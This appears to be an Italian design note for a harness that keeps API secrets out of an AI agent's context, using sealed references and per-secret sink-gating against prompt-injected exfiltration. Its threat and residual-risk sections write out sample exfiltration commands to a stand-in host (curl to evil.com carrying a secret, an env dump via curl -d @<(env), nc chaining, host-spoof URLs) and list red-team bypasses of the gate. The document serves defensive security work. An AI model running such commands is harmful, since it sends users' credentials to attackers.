---
name: sealed-secrets
description: "Gestione secret negli agenti: il VALORE non entra mai nel context del modello (sealed); il modello usa riferimenti {{secret:NAME}} sostituiti al confine del tool, con sink-gating per-secret. 3 vie di provisioning + regex-ingress. Design, non ancora implementato."
type: concept
status: design-draft
tags: [security, secrets, harness, guardrail, prompt-injection, training-vs-harness]
sources:
  - TG utente 2026-06-30 msg 577 (secret-vars: modello vede nome/descrizione, non il valore; ask-secret / terminale)
  - TG utente 2026-06-30 msg 578/579 (regex-ingress interception + ask-confirm sui falsi-positivi)
last_updated: 2026-06-30
---

# Sealed secrets — secret-reference per agenti

> **STATUS: IMPLEMENTATO v1** (2026-06-30). Idea utente msg 577/578/579. `src/sealed-secrets.mjs` (test 110/110, incl. red-team ×2 giri) + wiring `secrets-guardrail.ts` (egress) + `regex-ingress.ts` (ingress). Include `allowLocalHttp` (§4bis, msg 668). Residui best-effort (*exfiltration-via-use*) tracciati §residui.

## Problema

Un agente ha bisogno di USARE segreti (API key, token) per eseguire operazioni, ma il **valore del segreto non deve mai**: (a) entrare nel context del modello (→ niente leak via output, niente invio al provider LM, niente memorizzazione/training), (b) finire nella persistenza in chiaro, (c) essere esfiltrabile da un modello prompt-injected. Oggi `add_secret` è un TOOL che il modello chiama → il valore è GIÀ nel suo context quando lo registra: gap.

## Catena (why → problema → soluzione)

- **WHY**: il modello deve operare con segreti "in tranquillità" (msg 577) senza vederli.
- **PROBLEMA**: due minacce DIVERSE — (1) **incidenti** (chiave incollata per sbaglio, tool che legge un `.env`); (2) **attacchi** (modello prompt-injected che USA un secret sigillato in un sink ostile: `curl evil.com?k={{secret:X}}` → lo ruba senza averlo mai visto = **exfiltration-via-use**). Lo storage sicuro NON copre la #2.
- **SOLUZIONE**: pattern **sealed-secret / secret-reference**: valore out-of-band nel registry; il modello vede solo **nome + descrizione** e usa **`{{secret:NAME}}`**; l'harness sostituisce il valore reale **al confine `tool_call`**, SOLO verso sink allow-listed; egress-redaction come backstop.

## Componenti

### 1. Registry sigillato
- `secrets` table/registry: `{name, description, value(sealed), allowed_sinks[], created, source}`. Il `value` non è mai esposto a tool di lettura.
- `list_secrets()` (tool model-facing) → ritorna SOLO `[{name, description, allowed_sinks}]`, **mai il valore**. Il modello sa cosa esiste e a cosa serve.

### 2. Tre vie di PROVISIONING (il valore non passa MAI dal modello)
1. **Terminale esplicito**: `set_secret NAME <value> --desc "..." --allow-host api.openai.com` (CLI/tool harness-side) → scrive nel registry. Il modello non è coinvolto.
2. **Model ask-secret**: il modello, accorgendosi che gli serve un segreto per un'operazione, invoca `ask_secret(name, why)` → l'harness mostra a TE un box "il modello chiede il secret NAME per X — inserisci il valore" → il valore va dritto nel registry, **non torna al modello**.
3. **Regex-ingress con conferma** (msg 578/579): su **input utente** o **tool-result**, se un valore matcha un pattern-secret (riuso dei pattern esistenti: `AIza…`/`sk-…`/JWT/`github_pat_…`/`Bearer`), l'harness **intercetta PRIMA che vada al LM** e lo **sigilla** sostituendolo con un riferimento. Per i falsi-positivi → **ask-confirm**: "sembra un secret (pattern X) — lo sigillo? nome/descrizione?". Blocca l'incidente #1 (paste accidentale).

### 3. Reference-injection (uso)
- Il modello mette `{{secret:NAME}}` negli args di un tool (bash, http, …).
- Hook `tool_call`: l'harness **sostituisce** `{{secret:NAME}}` col valore reale PRIMA dell'esecuzione → il valore va all'operazione, **non torna al modello**.
- Egress-redaction (esistente): il valore viene rimosso dal RISULTATO del tool prima che torni al modello.

### 4. Sink-gating per-secret (la VERA sicurezza — il 20% che vale l'80%)
- Ogni secret dichiara `allowed_sinks` (es. host fidati: `api.openai.com`). La sostituzione `{{secret:NAME}}` avviene **SOLO** se la destinazione dell'operazione è allow-listed.
- Blocco di sink ostili/esfiltranti: `echo {{secret}} > file`, outbound verso host non-allow-listed, scrittura in una var. Si aggancia al **pre-flight** esistente.
- Difende dall'**exfiltration-via-use** (il modello non vede il valore ma potrebbe usarlo per spedirlo altrove). **Senza sink-gating, il sealed-secret è teatro.**

### 4bis. `allowLocalHttp` — secret LOCALE su http-loopback (utente msg 668, 2026-06-30)
> **STATUS: IMPLEMENTATO** (`src/sealed-secrets.mjs`, test block 11). Risolve un GAP reale: lo sviluppo locale richiede `http://localhost` (un JWT di sessione contro il dev-server), ma `https-only` blocca ogni http per i sealed-secrets. Né sealed (https-only) né `add_secret` (solo-redazione, redatto pure dagli argomenti) permettevano l'uso di un JWT su http locale.

- **Flag per-secret `allowLocalHttp`** (default **OFF**): quando ON, il secret è iniettabile su `http://` (e qualsiasi schema) MA **solo verso loopback LETTERALE** — `localhost` / `127.0.0.0/8` / `::1` (via `isLoopbackLiteral`). Host esterni in http → **sempre bloccati** (https-only invariato).
- **⚠ Framing onesto (review-loop 2026-06-30, H2)**: NON è la tesi "loopback è intrinsecamente non-esfiltrante". La minaccia che questo modulo difende è l'**exfiltration-via-use da un modello prompt-injected**, NON l'intercettazione sul filo. Contro quella minaccia il loopback **non è auto-sicuro**: un comando composto (`curl http://localhost ; nc evil.com`) o un **relay/redirect locale** (`curl http://localhost:8080/proxy?url=http://evil.com` con un dev-server che inoltra l'header) può ancora muovere il valore fuori. Ciò che rende la deroga accettabile è il **consenso ESPLICITO dell'utente** (+ la restrizione loopback-letterale che taglia le vie ESTERNE facili), NON la natura del loopback. → **non rilassare mai il gate di consenso** credendo che loopback porti la sicurezza da solo.
- **Mitigazione (allow-shape, non deny-shape)**: il fast-path concede SOLO una shape pulita — `allowLocalHttp` ON · ≥1 host e TUTTI loopback-letterali · **un solo URL** (`countUrls` su `://`, anti `2://evil.com` invisibile a `extractHosts`) · niente scrittura-file · niente **host-pinning** (`--resolve`/`--connect-to`/proxy/`Host:` rimapperebbero "localhost" su un IP esterno) · niente **composizione di comandi** (`;`/`&&`/`|`/`$()`/`/dev/tcp` + whitespace di **controllo** TAB/CR/VT/FF/NUL, via `hasCommandComposition`) · niente **operando-host estraneo** (`hasForeignHostToken`).
- **`hasForeignHostToken` — la guardia STRUTTURALE (3 giri di red-team)**: CAUSA-RADICE = `extractHosts` vede solo gli host `scheme://`, ma `curl`/`wget` accettano operandi **schemeless** in OGNI codifica IP (`curl http://localhost evil.com` → `evil.com` = 2° URL porta-80 con l'header-segreto applicato → leak; idem `8.8`→8.0.0.8, `1.2.3`→1.2.0.3, decimale grande, hex `0x..`, IPv6 `[..]` — tutti **verificati con curl reale**). Invece di rincorrere le codifiche con regex (denylist incompleto, bucato 3 volte dal red-team), **normalizziamo ogni candidato-host come fa curl** via `new URL("http://"+tok).hostname` (parser WHATWG = stessa espansione IPv4: `2130706433`→`127.0.0.1`, `0x7f000001`→`127.0.0.1`, `8.8`→`8.0.0.8`) e pretendiamo loopback. Pre-pass: si tolgono le stringhe quotate (header/body) e gli URL scheme://. Candidato = token con punto/`0x`/`[..]`/decimale-grande → esclude i flag-value piccoli (`--max-time 30`) → niente falso-blocco.
- **Residui accettati** (de-prioritizzati, exfil-via-use): (a) host **single-label** senza punto (`myserver`) → esfiltra solo se l'attaccante controlla il DNS locale (contrived); (b) un **URL/`://` dentro un body o user-agent quotato** è visto da `extractHosts`/`countUrls` (che NON spogliano le quote come `hasForeignHostToken`) → falso-blocco (ergonomico, fail-SAFE: il modello usi https o semplifichi); (c) **consenso per-sessione** (non per-operazione): una singola mis-classificazione varrebbe per la sessione — mitigato dal disclosure nel dialog + dalla normalizzazione curl-accurate; il per-call confirm è un hardening futuro tracciato; (d) control-char (TAB/CR/NUL) DENTRO un arg quotato → `hasCommandComposition` (che scansiona il raw) blocca comunque (conservativo deliberato).
- **⚠ allowedSinks bypassato per loopback (M2)**: quando il fast-path concede, IGNORA gli `allowedSinks` dichiarati dal secret — un secret con `allowLocalHttp:true` E `allowedSinks:["api.x.com"]` è iniettabile verso `localhost` anche se localhost ∉ allowedSinks. È **intenzionale** (un JWT locale non deve dichiarare loopback negli allowedSinks), ma è un percorso disgiunto: ragionare su "il secret X può raggiungere il sink Y" richiede di guardare DUE rami (fast-path loopback + allow-list esterno).
- **🎯 DIREZIONE DUREVOLE (architect-review, ADR futuro)**: il fast-path che fa parsing-regex+`new URL` di un comando shell free-form è **fragile by design** (il red-team l'ha bucato 4 volte — è il fallimento atteso di questa classe: una corsa agli armamenti contro bash+curl che non controlliamo). Ciò che lo rende accettabile ORA è (i) l'invariante PRIMARIO (valore mai al provider/transcript) è garantito a un confine DIVERSO (injection al `tool_call`, post-provider) e indipendente da tutto il fast-path; (ii) il design è **allow-shape** (shape-pulita-o-fallback-sicuro), quindi fallisce SAFE; (iii) exfil-via-use è de-prioritizzato. Il **target durevole** = iniettare i secret SOLO in un **tool `http_request` tipizzato controllato dall'harness** (un `url` typed → 1 `new URL` → check loopback → fine; niente shell, niente `hasForeignHostToken`/`hasCommandComposition`). Tutta la superficie fragile esiste solo perché il sink è bash free-form. → ADR da scrivere; il regex-fast-path resta **interim/legacy-fallback**, non "il design".
- **Residuo (exfil-via-use, DE-PRIORITIZZATO msg 593)**: la shape pulita blocca l'exfil-FACILE, non quella sofisticata (relay locale, bare-host sibling in un tool multi-arg). Coerente con la difesa best-effort dichiarata per l'exfil-via-use; il P1 (valore mai al provider/transcript) resta garantito a prescindere (allowLocalHttp non lo tocca: il valore è iniettato al `tool_call`, DOPO la richiesta al provider).
- **Chi lo abilita (MAI il modello da solo, utente msg 668)**: (a) l'utente da CLI `set-secret … --allow-local-http` o config `"allowLocalHttp": true` (+ **riavvio** pi: la config si rilegge al boot); (b) il modello chiama `request_local_http(name, why)` → **Ask interattivo** (`ctx.ui.confirm` della TUI, che DISCLOSA lo scope di-sessione e il rischio relay) → l'utente accetta intenzionalmente → `setAllowLocalHttp`. In headless (no `ctx.hasUI`) degrada a notify (richiede restart). Il modello PUÒ solo CHIEDERE, mai decidere. **Scope**: la concessione è **per-sessione** e vale per ogni servizio loopback (non per-operazione) — disclosato nel dialog; il per-operazione/TTL è un possibile hardening futuro.
- **Limite noto**: `localhost` è incluso per ergonomia; un `/etc/hosts` sabotato potrebbe rimapparlo (rischio residuo accettato: è la macchina dell'utente). IPv6 in URL `http://[::1]` non è estratto da `extractHosts` → fail-closed (bloccato): usa `127.0.0.1`/`localhost`.

## Config (opt-in, gemello degli altri toggle)
- `secrets.sinkGating = strict | warn | off` (default **strict**): allow-host fail-closed + https-only + deny scrittura-file/pipe + deny host-pinning (`curl --resolve/--connect-to/proxy/-H Host:`). Env `HARNESS_SECRETS_SINK_GATING`.
- `secrets.regexIngress = off | ask | auto` (default **ask**): ✅ **cablata al hook `input`** (`secrets-guardrail.ts`, 2026-06-30, `autoSealIngress`): un valore secret-shaped incollato viene sigillato e **sostituito con `{{secret:INGRESS_N}}` via `action:"transform"` PRIMA che raggiunga il provider** (→ mai al provider, mai nei transcript nativi). `ask` notifica (warning), `auto` silenzioso (info), `off` disattiva. Match auto-rilevati in lockdown (no allowedSinks). Env `HARNESS_SECRETS_REGEX_INGRESS`. Limite: solo shape NOTE (`SECRET_PATTERNS`); un segreto non-shape resta scoperto (l'utente usi `set_secret`/`request_secret`).
- `redactEgress` **per-secret** (metadata, default **true**): opt-out per i secret CORTI/poco-entropici (OTP, PIN, una data, msg 603) dove la redazione globale del valore farebbe rumore. `false` (`set-secret --no-redact-egress`) → sigillato+iniettabile ma NON nel Set di egress (trade-off esplicito).

## Classificazione training-vs-harness (regola #11)
- **F-harness PIENA**: store sigillato + `list_secrets`(nome/desc) + reference-injection + egress-redaction + **sink-gating** + regex-ingress. Tutto deterministico, niente training.
- **S (DEGRADATA-MA-UTILE)**: il modello sa QUANDO/QUALE secret serve + usa `{{secret:NAME}}` + invoca `ask_secret`. Stato-senza-training: il modello vede la lista e i riferimenti → usabile; un fallback deterministico può anche auto-suggerire il secret per operazioni note. **Reward sull'OUTCOME** (operazione riuscita SENZA leak), mai sul "ha usato un secret".

## Stratificazione delle difese (non illudersi)
| difesa | contro | garanzia |
|---|---|---|
| valore mai-in-context (provisioning out-of-band + ref-injection) | leak via output/provider/training | forte (per i secret sealed) |
| regex-ingress (hook `input`, ✅ attiva) | INCIDENTI (paste accidentale, .env letto) | il valore secret-shaped è sigillato+trasformato PRIMA del provider; riduce ma non azzera (solo shape NOTE — un segreto non-pattern sfugge) |
| egress-redaction (backstop) | valore che ricompare in un output (content+`details`) | best-effort (literal-match: un modello può trasformarlo/encodare). Invariante P1: ogni sealed-value redatto, anche corto — salvo `redactEgress=false` (opt-out esplicito OTP) |
| **sink-gating per-secret** | **ATTACCHI** (exfiltration-via-use, prompt-injection) | allow-host fail-closed (incl. anti-spoof `#`/`?` e anti host-pinning); resta euristico su shell composta/bare-host (vedi §residui) |

## Stato implementazione + residui (review-loop 2026-06-30, 17 finding confermati)

> Range git commit `706983d..2318f89`. Priorità utente (msg 593): **P1** valore mai-al-provider (✅ garantito dall'architettura value-mai-in-context) + **P2** mai-nei-transcript (✅ nostri store; redazione content+`details` + conversation-capture).

**Fix applicati:**
- **P0 host-spoof** (`extractHosts`): l'authority terminava solo su `/` → `https://evil.com#.openai.com` faceva suffix-match con `.openai.com` mentre curl si connette a `evil.com`. Fix: termina su `?`/`#`/`\` + valida host DNS-charset (fail-closed sui residui). + deny **host-pinning** (`--resolve`/`--connect-to`/proxy/`-H Host:`).
- **P1 backstop short-secret**: `setSecret` ignorava il rifiuto di `add_secret` (guard min-len) → un secret corto era iniettabile ma non redatto. Fix: `registerEgressRaw` (no guard: provisioning out-of-band) → invariante "ogni sealed-value redigibile". + `redactEgress` per-OTP (opt-out esplicito).
- **P2 details**: `tool_result.details` ora redatto (non solo `content`) — poteva persistere nel log nativo di pi.
- **P2 regexIngress dead-code → ✅ CABLATO** (2026-06-30, utente msg 610 "dovevi farla stanotte"): `autoSealIngress` nel hook `input` con `action:"transform"` → il valore secret-shaped non raggiunge il provider; default `ask`.

**Residui DE-PRIORITIZZATI** (msg 593, *exfiltration-via-use* = "hard problem" esplicitamente rimandato; il sink-gating è dichiarato layer best-effort, NON un confine di sicurezza — P1 resta garantito a prescindere):
- **bare-host / tool MCP strutturati**: una destinazione senza `scheme://` (`curl evil.com`, `{host:'evil.com'}`) non è vista da `extractHosts` → un secret senza `allowedSinks` può uscirvi. Mitigazione futura: gating per-tool sul TIPO (rete vs locale), non sul parsing-testo.
- **comandi shell composti**: `curl allow.com ...; curl evil.com -d @<(env)` — il gate vede solo l'host allow-listed. Futuro: trattare `;`/`&&`/`|`/`$(...)`/`<(...)` + un ref come fail-closed in strict.
- **hook-order** (latente): l'injection muta `event.input` condiviso; oggi `pre-flight` precede `secrets-guardrail` per ordine-fs, non per invariante imposta. Futuro: garantire injection-as-last + nessun hook che persista `event.input` dopo. (Nessun leak attuale: pi clona gli args via `structuredClone` prima di `execute` → la history conserva il placeholder; test `injectIntoStrings`-puro presidia la regressione.)

## Cosa abbiamo già vs nuovo
- **Già**: pattern statici (`secrets-redact.mjs`), egress-redaction su `tool_result` + dynamic-map opaca (`secrets-guardrail.ts`), `add_secret` con guardia min-len/distinct (`secrets-registry.mjs`).
- **Nuovo**: provisioning out-of-band (terminale + ask-secret) così il valore non passa dal modello · `list_secrets`(nome/desc) · reference-injection `{{secret:NAME}}` al `tool_call` · **sink-gating per-secret** · regex-ingress-con-conferma · config.

## Open questions
- Modello di sink-gating: allow-host per-secret (forte) vs deny-list di sink-esfiltranti (più semplice da iniziare) vs taint-tracking (pesante)? → reco: allow-host per-secret, con deny-list come default conservativo per i secret senza `allowed_sinks`.
- `ask_secret` headless (cron/SDK senza TUI): come si chiede il valore? → forse non-disponibile headless (il secret deve essere pre-provisionato da terminale).
- ~~Verifica/testbook: probe output-senza-valore + red-team sink-gating-blocca~~ → ✅ coperte (test red-team block 8). ~~wiring `regexIngress`~~ → ✅ FATTO (block 9, `autoSealIngress` su hook `input`). Residuo minore: `ask` headless non blocca davvero (degrada a seal-provvisorio+notify; il confirm-interattivo vero richiede prompt TUI).

## Link
- [[concepts/secret-section-exfiltration-defense]] (difesa esfiltrazione, parente)
- [[concepts/training-vs-harness-classification]] (F/S)
- `harness/.pi/extensions/secrets-guardrail.ts` · `harness/src/secrets-registry.mjs` · `harness/src/secrets-redact.mjs` (infra esistente)
- [[concepts/untrusted-content-delimiting]] (inbox/tool-result come dato, non istruzioni — vettore della exfiltration-via-use)
